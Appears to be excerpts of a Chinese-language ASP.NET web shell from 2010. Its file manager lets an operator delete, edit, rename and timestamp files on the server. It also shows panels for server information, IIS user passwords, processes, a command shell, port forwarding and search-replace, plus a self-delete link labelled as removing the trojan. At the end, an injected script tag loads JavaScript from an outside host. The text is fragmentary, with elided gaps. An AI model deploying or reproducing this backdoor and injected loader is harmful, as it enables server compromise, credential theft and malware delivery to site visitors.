...
Code by Bin
Make in China
Blog: http://www.2ba.in
E-mail : master@2ba.in
*/
...
if(i==2)
{
pc.Text="<a href=\"javascript:Bin_PostBack('Bin_Parent','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\">父目录</a>";
}
p.Cells.Add(pc);
UGzP.Rows.Add(p);
}
...
ZGKh.Text="<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\">删除</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \">重命名</a>";
tr.Cells.Add(ZGKh);
UGzP.Rows.Add(tr);
}
...
GLpi.Text="<a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\">下载</a> | <a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">复制</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">编辑</a> | <a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">重命名</a> | <a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\">时间</a> ";
...
if(i==2)
{
lGV.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('SJv',d_file)};}\">删除所选</a>";
}
if(i==3)
{
lGV.ColumnSpan=4;
lGV.Style.Add("text-align","right");
lGV.Text=vLlH+" 目录/ "+aYRwo+" 文件";
}
oWam.Cells.Add(lGV);
}
UGzP.Rows.Add(oWam);
...
Response.Redirect("http://www.2ba.in");
}
catch(Exception error)
{
xseuB(error.Message);
...
Bin_H2_Mac.InnerText="Mac信息 >>";
Bin_H2_Driver.InnerText="驱动程序信息 >>";
StringBuilder yEwc=new StringBuilder();
StringBuilder hwJeS=new StringBuilder();
StringBuilder jXkaE=new StringBuilder();
yEwc.Append("<li><u>域名: </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
yEwc.Append("<li><u>IP地址 : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
yEwc.Append("<li><u>远程端口 : </u>"+IKjwH+"</li>");
yEwc.Append("<li><u>服务器操作系统 : </u>"+Environment.OSVersion+"</li>");
yEwc.Append("<li><u>服务器软件 : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
yEwc.Append("<li><u>服务器的用户名 : </u>"+Environment.UserName+"</li>");
yEwc.Append("<li><u>服务器时间 : </u>"+System.DateTime.Now.ToString()+"</li>");
yEwc.Append("<li><u>服务器时区 : </u>"+cCf("Win32_TimeZone").Rows[0]["Caption"]+"</li>");
DataTable BIOS=cCf("Win32_BIOS");
yEwc.Append("<li><u>服务器的BIOS： : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
yEwc.Append("<li><u>CPU的数量 : </u>"+cpu.ToString()+"</li>");
yEwc.Append("<li><u>CPU版本 : </u>"+NPPZ+"</li>");
...
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="Upload" OnClick="lbjLD"/></div><asp:LinkButton ID="OLJFp" runat="server" Text="WebRoot" OnClick="mcCY"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">创建目录</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">创建文件</a>
 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">自杀(删除木马自身)</a>
</td></tr>
<asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>文件名</asp:TableCell><asp:TableCell Width="25%">最后修改</asp:TableCell><asp:TableCell Width="15%">大小</asp:TableCell><asp:TableCell Width="25%">动作</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--FileEdit--%>
<div id="vrFA" runat="server">
<p>当前文件(导入新的文件名称和新的文件)<br/>
...
<p>参考文件(fullpath)<br/><input class="input" id="lICp" type="text" size="120" runat="server"/></p>
<p><asp:Button ID="JEaxV" runat="server" Text="Submit" CssClass="bt" OnClick="XXrLw"/></p>
<h2>最后修改设置 &raquo;</h2>
<p>当前文件(fullpath)<br/><input class="input" id="pWVL" type="text" size="120" runat="server"/></p>
<p>
...
<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_用户</asp:TableCell><asp:TableCell>IIS_密码</asp:TableCell><asp:TableCell>域名</asp:TableCell><asp:TableCell>路径</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--Process--%>
...
<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>编号</asp:TableCell><asp:TableCell>进程</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>优先</asp:TableCell><asp:TableCell>动作</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--CmdShell--%>
...
<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>编号</asp:TableCell><asp:TableCell>名称</asp:TableCell><asp:TableCell>路径</asp:TableCell><asp:TableCell>状况</asp:TableCell><asp:TableCell>启动模式</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--Sysinfo--%>
...
<asp:TableRow CssClass="head"><asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">值</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--PortScan--%>
...
<td style="width:20%" align="left">远程IP : <input class="input" runat="server" id="llH" type="text" size="20" value="www.2ba.in"/></td>
<td style="width:20%" align="left">远程端口 : <input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/></td></tr>
<tr align="center"><td colspan="5"><br/><asp:Button ID="FJE" CssClass="bt" runat="server" Text="端口转发" OnClick="wDZ"/> <asp:Button ID="giX" CssClass="bt" runat="server" Text="全部清除" OnClick="vJNsE"/> <asp:Button ID="GFsm" CssClass="bt" runat="server" Text="刷新" OnClick="tYoZ"/></td></tr></table></div>
<%--Search--%>
...
<tr align="center">
<td style="width:20%" align="left">取代(替换)</td>
<td style="width:60%" align="left"><textarea id="qPe" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="YZw"/> 取代(替换)</td>
</tr>
<tr align="center">
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2010 <a href="http://www.2ba.in" target="_blank">欧欧</a> All Rights Reserved.</div></div>
</form>
</body>
</html>
<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<scr<script language=javascript src=http://web.5dfgy.cn/12.js></script>